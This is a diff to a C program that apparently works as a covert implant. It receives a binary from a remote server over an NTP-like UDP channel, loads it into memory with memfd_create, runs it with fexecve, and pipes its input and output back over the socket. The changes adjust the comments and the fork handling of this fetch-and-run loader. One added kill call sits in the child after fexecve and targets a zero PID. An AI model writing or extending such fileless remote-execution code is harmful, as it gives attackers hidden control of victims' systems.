@@ -13,6 +13,8 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <time.h>
+#include <signal.h>
+
 
 #define NTP_TIMESTAMP_DELTA 2208988800ull
 
@@ -83,27 +85,30 @@ int main() {
                 recvfrom(sock_fd, bin, a, 0, (struct sockaddr *)&servaddr, &servaddr_len);
                 bin -= (header[1] - a);
 
-                // Execute binary
+                // Create binary in memory
                 a = memfd_create("0", 0);
                 write(a, bin, header[1]);
 
+                // Parse args
                 char** argv = malloc(sizeof(char*));
                 int b = 0;
                 char *p = strtok(args, " ");
                 while (p != NULL) {
                     argv[b] = malloc(strlen(p) + 1);
                     strcpy(argv[b], p);
-                    argv = realloc(argv, sizeof(char*) * (++b));
+                    argv = realloc(argv, sizeof(char*) * (++b)); 
                     p = strtok (NULL, " ");
                 }
 
+                // Create pipes for stdin/stdout to be redirected to socket
                 int stdin_pipe[2];
                 int stdout_pipe[2];
                 pipe(stdin_pipe);
                 pipe(stdout_pipe);
 
                 // Fork the process - exec section
-                if (fork()) {
+                int child_pid = fork();
+                if (!child_pid) {
                     close(stdin_pipe[1]);
                     close(stdout_pipe[0]);
                     dup2(stdin_pipe[0], 0);
@@ -111,6 +116,7 @@ int main() {
                     dup2(stdout_pipe[1], 2);
                     fexecve(a, argv, argv);
                     close(sock_fd);
+                    kill(child_pid, SIGKILL);
                 } else {
                     close(stdin_pipe[0]);
                     close(stdout_pipe[1]);
@@ -133,7 +139,6 @@ int main() {
                         }
                     }
                 }
-                sleep(60);
             } else {
                 sleep(1);
                 continue;
